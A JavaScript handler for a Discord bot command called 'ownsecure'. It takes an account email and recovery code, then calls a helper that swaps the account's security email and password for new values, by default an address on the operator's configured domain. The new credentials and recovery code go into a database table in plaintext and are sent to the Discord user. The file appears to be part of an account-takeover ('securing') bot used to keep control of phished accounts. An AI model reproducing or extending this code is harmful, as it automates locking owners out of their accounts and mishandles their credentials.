const { ButtonBuilder, ButtonStyle, ActionRowBuilder } = require('discord.js');
const recoveryCodeSecure = require("../../utils/secure/recoveryCodeSecure.js")
const { domains } = require("../../../config.json");
const generate = require("../../utils/generate.js");
const { queryParams } = require("../../../db/database.js")
const validEmail = require("../../utils/emails/validEmail.js");
const insertaccount = require('../../../db/insertaccount.js')

module.exports = {
    name: "ownsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            const processStartTime = Date.now();


            let settings = await client.queryParams(
                `SELECT * FROM secureconfig WHERE user_id=?`,
                [client.username]
            );

            if (settings.length === 0) {
                console.log(`Settings not found for user: ${client.username}`);
                return interaction.reply({
                    content: `Couldn't get your settings!`,
                    ephemeral: true,
                });
            }

            const email = interaction.components[0].components[0].value;
            const recoveryCode = interaction.components[1].components[0].value;


            const secEmailInput = interaction.components[2].components[0].value;
            const secEmail = secEmailInput && validEmail(secEmailInput)
                ? secEmailInput
                : `${generate(16)}@${settings?.domain ? settings.domain : domains[0]}`;


            const password = interaction.components[3].components[0].value || generate(16);

            settings = settings[0];
            const initialReply = await interaction.reply({ content: 'Trying to secure...', ephemeral: true });

            const data = await recoveryCodeSecure(email, recoveryCode, secEmail, password);

            if (data === null) {
                return initialReply.edit({ content: `Invalid email address!`, ephemeral: true });
            }
            if (data === 'tfa') {
                return initialReply.edit({ content: `Cannot secure when 2FA is enabled!`, ephemeral: true });
            }
            if (data === 'invalid') {
                return initialReply.edit({ content: `Invalid Recovery Code!`, ephemeral: true });
            }
            if (data === 'same') {
                return initialReply.edit({ content: `Cannot secure with old security email and/or password!`, ephemeral: true });
            }



            if (data?.email2 && data?.recoveryCode && data?.secEmail && data?.password) {
                const recsecId = generate(32);
                await client.queryParams(
                    `INSERT INTO actions(id, action) VALUES(?, ?)`,
                    [`${recsecId}`, `recsecure|${data.email2}|${data.secEmail}|${data.password}|${data.recoveryCode}`]
                );

                const msg = {
                    embeds: [
                        {
                            title: `Secured to your email and/or password!`,
                            fields: [
                                { name: "Email", value: "```" + data.email2 + "```", inline: true },
                                { name: "Security Email", value: "```" + data.secEmail + "```", inline: true },
                                { name: "Password", value: "```" + data.password + "```", inline: false },
                                { name: "Recovery Code", value: "```" + data.recoveryCode + "```", inline: false },
                            ],
                            color: 0xb2c7e0, 
                        },
                    ],
                    components: [
                        new ActionRowBuilder()
                            .addComponents(
                                new ButtonBuilder()
                                    .setCustomId(`copyrec|${recsecId}`)
                                    .setLabel('Copy Text')
                                    .setStyle(ButtonStyle.Secondary)
                            ),
                    ],
                    ephemeral: true,
                };

                await interaction.user.send(msg); // Send the message privately to the user
                return interaction.editReply(msg); // Edit the original reply
            }


            console.log(`Invalid data received:`, data);
            return initialReply.edit({
                content: `Failed to secure due to invalid data format. Please report this to an admin!`,
                ephemeral: true,
            });

        } catch (error) {
            console.error(`Error in ownsecure callback: ${error}`);
            return interaction.reply({
                content: `An unexpected error occurred. Please try again later.`,
                ephemeral: true,
            });
        }
    },
};
